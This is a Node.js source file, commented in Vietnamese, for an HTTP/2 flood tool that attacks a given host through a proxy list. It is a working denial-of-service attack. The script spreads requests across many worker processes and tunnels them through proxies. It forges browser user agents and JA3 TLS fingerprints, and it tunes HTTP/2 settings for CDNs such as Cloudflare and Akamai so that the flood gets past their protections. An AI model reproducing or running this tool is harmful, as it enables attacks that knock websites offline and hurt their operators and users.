const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const http = require('http');
const crypto = require("crypto");
const fs = require("fs");

// --- CẤU HÌNH BAN ĐẦU ---
const JA3_PROFILES = {
    "chrome": {
        ciphers: "GREASE:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        ecdhCurve: "GREASE:X25519:P-256:P-384:P-521",
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
    "firefox": {
        ciphers: "GREASE:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_DHE_RSA_WITH_AES_128_GCM_SHA256:TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384",
        ecdhCurve: "GREASE:X25519:P-256:P-384",
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
    "safari": {
        ciphers: "GREASE:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
        ecdhCurve: "GREASE:X25519:P-256",
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
};
const BROWSER_PROFILES = {
    "chrome": {
        platforms: ["Windows", "macOS", "Linux"],
        versions: { min: 120, max: 127 },
        getSpecificHeaders: (version, platform, isMobile) => ({
            "sec-ch-ua": `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": isMobile ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platform}"`,
        })
    },
    "firefox": { platforms: ["Windows", "macOS", "Linux"], versions: { min: 120, max: 128 }, getSpecificHeaders: () => ({ "te": "trailers" }) },
    "safari": { platforms: ["macOS"], versions: { min: 16, max: 17 }, getSpecificHeaders: () => ({}) },
    "mobile-chrome": { platforms: ["Android"], versions: { min: 120, max: 127 }, getSpecificHeaders: (version, platform, isMobile) => BROWSER_PROFILES.chrome.getSpecificHeaders(version, platform, isMobile) },
    "mobile-safari": { platforms: ["iOS"], versions: { min: 16, max: 17 }, getSpecificHeaders: () => ({}) },
};

// --- CÁC HÀM TIỆN ÍCH ---
function randomIntn(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomElement(elements) {
    if (!elements || elements.length === 0) return '';
    return elements[randomIntn(0, elements.length - 1)];
}

// --- CẤU HÌNH CHUNG & XỬ LÝ LỖI ---
process.on('uncaughtException', () => {}).on('unhandledRejection', () => {}).setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED;

// --- XỬ LÝ ĐẦU VÀO ---
if (process.argv.length < 7) {
    console.log(`Usage: node <script_name>.js <host> <time> <req_per_ip> <thread> <proxy.txt>`);
    process.exit();
}
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

// --- LỚP KẾT NỐI PROXY ---
class NetSocket {
    HTTP(options, callback) {
        const req = http.request({
            host: options.host, port: options.port, method: 'CONNECT', path: `${options.address}:443`,
            timeout: options.timeout * 1000, headers: { 'Connection': 'Keep-Alive', 'Host': options.address }
        });
        req.on('connect', (res, socket) => {
            if (res.statusCode === 200) callback(socket, undefined);
            else { socket.destroy(); callback(undefined, new Error(`Proxy responded with ${res.statusCode}`)); }
        });
        req.on('timeout', () => req.destroy());
        req.on('error', (err) => { req.destroy(); callback(undefined, err); });
        req.end();
    }
}
const Socker = new NetSocket();

// --- LẤY THÔNG TIN ISP ---
let isp = 'Unknown', geoCountryCode = 'US';
async function getIPAndISP(url) {
    try {
        const { address } = await util.promisify(dns.lookup)(url);
        const response = await fetch(`http://ip-api.com/json/${address}`);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp || 'Unknown';
            geoCountryCode = data.countryCode || 'US';
        }
    } catch (error) { /* Bỏ qua lỗi */ }
}

// --- CẤU HÌNH CLUSTER ---
if (cluster.isMaster) {
    console.clear();
    console.log('╔══════════════════════════════════════════════════╗');
    console.log(`  Target: ${args.target}`);
    console.log(`  Time: ${args.time}s | Threads: ${args.threads} | Requests/IP: ${args.Rate}`);
    console.log(`  Proxies: ${args.proxyFile} (${proxies.length})`);

    let totalStatusCounts = {}; // **NEW**: Biến tổng hợp status code

    (async () => {
        await getIPAndISP(parsedTarget.host);
        console.log(`  ISP: ${isp} | Country: ${geoCountryCode}`);
        console.log('╚══════════════════════════════════════════════════╝');
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork({ ISP: isp, GEO: geoCountryCode });
            // **NEW**: Lắng nghe status code từ worker
            worker.on('message', (msg) => {
                if (msg.statusCode) {
                    totalStatusCounts[msg.statusCode] = (totalStatusCounts[msg.statusCode] || 0) + 1;
                }
            });
        }
    })();

    // **NEW**: Hiển thị báo cáo tổng hợp mỗi 3 giây
    const logInterval = setInterval(() => {
        if (Object.keys(totalStatusCounts).length > 0) {
            process.stdout.write(`\r[STATS] Total Status Codes: ${JSON.stringify(totalStatusCounts)}   `);
        }
    }, 3000);

    setTimeout(() => {
        console.log('\n[INFO] Attack finished.');
        clearInterval(logInterval);
        process.exit(0);
    }, args.time * 1000);

} else { // Worker process
    isp = process.env.ISP;
    geoCountryCode = process.env.GEO;
    setInterval(runFlooder);
}

// --- LOGIC TẠO HEADER & DANH TÍNH ---
const platformVersions = { "Windows": ["10.0", "11.0"], "macOS": ["13.0", "14.0"], "Linux": ["5.15.0"], "Android": ["12.0", "13.0"], "iOS": ["16.0", "17.0"] };
const referers = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"];
const resourcePaths = [
    { path: '/css/style.css', dest: "style", accept: "text/css,*/*;q=0.1" },
    { path: '/js/main.js', dest: "script", accept: "*/*" },
    { path: '/img/logo.png', dest: "image", accept: "image/avif,image/webp,*/*;q=0.8" },
];

function createIdentity() {
    const browser = randomElement(Object.keys(BROWSER_PROFILES)), profile = BROWSER_PROFILES[browser], version = randomIntn(profile.versions.min, profile.versions.max);
    const platform = randomElement(profile.platforms), isMobile = browser.startsWith('mobile'), fullVersion = `${version}.0.${randomIntn(1000, 6000)}.${randomIntn(10, 200)}`;
    let userAgent;
    switch (browser) {
        case 'firefox': userAgent = `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions.Windows)}` : `X11; ${platform} x86_64`}; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`; break;
        case 'safari': userAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`; break;
        case 'mobile-safari': userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS ${randomElement(platformVersions.iOS).replace('.', '_')} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Mobile/15E148 Safari/604.1`; break;
        default: userAgent = `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions.Windows)}` : isMobile ? `Linux; Android ${randomElement(platformVersions.Android)}` : `X11; ${platform} x86_64`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} ${isMobile ? 'Mobile ' : ''}Safari/537.36`; break;
    }
    const ja3Key = browser.replace('mobile-', '');
    return { userAgent, baseHeaders: { "user-agent": userAgent, "accept-language": `en-US,en;q=0.9,${geoCountryCode.toLowerCase()};q=0.8`, "upgrade-insecure-requests": "1", ...profile.getSpecificHeaders(version, platform, isMobile) }, ja3Profile: JA3_PROFILES[ja3Key] };
}

// --- BỘ QUẢN LÝ PHIÊN ---
class SessionManager {
    constructor() { this.cookies = {}; this.cache = new Map(); }
    addCookies(setCookieHeaders) { if (!setCookieHeaders) return; (Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders]).forEach(c => { try { const p = c.split(';')[0].split('='); if (p.length >= 2) this.cookies[p[0].trim()] = p.slice(1).join('=').trim(); } catch {} }); }
    getCookieHeader() { const e = Object.entries(this.cookies); return e.length ? e.map(([n, v]) => `${n}=${v}`).join('; ') : null; }
    updateCache(path, headers) { const { etag, 'last-modified': lastModified } = headers; if (etag || lastModified) this.cache.set(path, { etag, lastModified }); }
    getCacheHeaders(path) { const c = this.cache.get(path), h = {}; if (c) { if (c.etag) h['if-none-match'] = c.etag; if (c.lastModified) h['if-modified-since'] = c.lastModified; } return h; }
}

// --- HÀM LẤY CÀI ĐẶT HTTP/2 ---
function getSettingsBasedOnISP(isp) {
    const defaultSettings = { headerTableSize: 65536, initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554332, maxHeaderListSize: 262144, enablePush: false, maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000, maxFrameSize: 16384, enableConnectProtocol: false };
    const microsoftVnIspSettings = { headerTableSize: 4096, initialWindowSize: 8388608, maxConcurrentStreams: 100 };
    const ispSettingsMap = {
        'Cloudflare': { initialWindowSize: 65536, enableConnectProtocol: false }, 'OVH': { headerTableSize: 4096, initialWindowSize: 65536, maxFrameSize: 16777215, maxConcurrentStreams: 128 },
        'Akamai': { headerTableSize: 4096, maxConcurrentStreams: 100, initialWindowSize: 6291456, maxHeaderListSize: 32768 }, 'Fastly': { headerTableSize: 4096, initialWindowSize: 65535, maxConcurrentStreams: 100 },
        'Amazon': { maxConcurrentStreams: 100, initialWindowSize: 65535 }, 'Google': { headerTableSize: 4096, initialWindowSize: 1048576, maxConcurrentStreams: 100, maxHeaderListSize: 137216 },
        'Microsoft': microsoftVnIspSettings, 'VIETNIX': microsoftVnIspSettings, 'VNPT': microsoftVnIspSettings, 'Hetzner': { maxConcurrentStreams: 150, initialWindowSize: 1048576 },
    };
    for (const key in ispSettingsMap) { if (isp.includes(key)) return { ...defaultSettings, ...ispSettingsMap[key] }; }
    return defaultSettings;
}

// --- LOGIC CHÍNH ---
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [host, port] = proxyAddr.split(":");
    const proxyOptions = { host, port: parseInt(port), address: parsedTarget.host, timeout: 15 };
    const identity = createIdentity();

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        const tlsOptions = { secure: true, ALPNProtocols: ["h2"], ciphers: identity.ja3Profile.ciphers, sigalgs: identity.ja3Profile.sigalgs, socket: connection, ecdhCurve: identity.ja3Profile.ecdhCurve, honorCipherOrder: true, rejectUnauthorized: false, secureProtocol: randomElement(identity.ja3Profile.secureProtocol), secureOptions, servername: parsedTarget.host };
        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
        const client = http2.connect(parsedTarget.href, { createConnection: () => tlsSocket, settings: getSettingsBasedOnISP(isp) });
        const session = new SessionManager();
        
        const handleResponse = (headers, path) => {
            const statusCode = headers[':status'];
            // **UPDATED**: Gửi status code về cho master process
            if (statusCode && process.send) {
                process.send({ statusCode });
            }
            session.addCookies(headers['set-cookie']);
            session.updateCache(path, headers);
        };

        async function simulatePageLoad(path, referer) {
            if (tlsSocket.destroyed) return;
            const docHeaders = { ...identity.baseHeaders, ":method": "GET", ":authority": parsedTarget.host, ":scheme": "https", ":path": path, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "sec-fetch-site": referer ? "same-origin" : "cross-site", "sec-fetch-mode": "navigate", "sec-fetch-dest": "document", "referer": referer || randomElement(referers), ...session.getCacheHeaders(path) };
            const cookie = session.getCookieHeader(); if (cookie) docHeaders.cookie = cookie;
            const docReq = client.request(docHeaders);
            docReq.on('response', (headers) => handleResponse(headers, path));
            docReq.end();
            await new Promise(resolve => setTimeout(resolve, randomIntn(100, 300)));
            
            const subResources = resourcePaths.slice(0, randomIntn(1, resourcePaths.length));
            for (const r of subResources) {
                if (tlsSocket.destroyed) break;
                const resHeaders = { ...identity.baseHeaders, ":method": "GET", ":authority": parsedTarget.host, ":scheme": "https", ":path": r.path, "accept": r.accept, "sec-fetch-site": "same-origin", "sec-fetch-mode": "no-cors", "sec-fetch-dest": r.dest, "referer": `${parsedTarget.protocol}//${parsedTarget.host}${path}`, ...session.getCacheHeaders(r.path) };
                const cookie = session.getCookieHeader(); if (cookie) resHeaders.cookie = cookie;
                const resReq = client.request(resHeaders);
                // **UPDATED**: Ghi nhận status code cho cả tài nguyên phụ
                resReq.on('response', (headers) => handleResponse(headers, r.path));
                resReq.end();
            }
        }

        client.on('connect', async () => {
            for (let i = 0; i < args.Rate; i++) {
                if (tlsSocket.destroyed) break;
                await simulatePageLoad(parsedTarget.path, i > 0 ? `${parsedTarget.protocol}//${parsedTarget.host}${parsedTarget.path}` : null);
                await new Promise(resolve => setTimeout(resolve, randomIntn(1000, 3000)));
            }
            client.destroy(); connection.destroy();
        });

        client.on("error", () => { client.destroy(); connection.destroy(); });
        client.on("close", () => { client.destroy(); connection.destroy(); });
    });
}
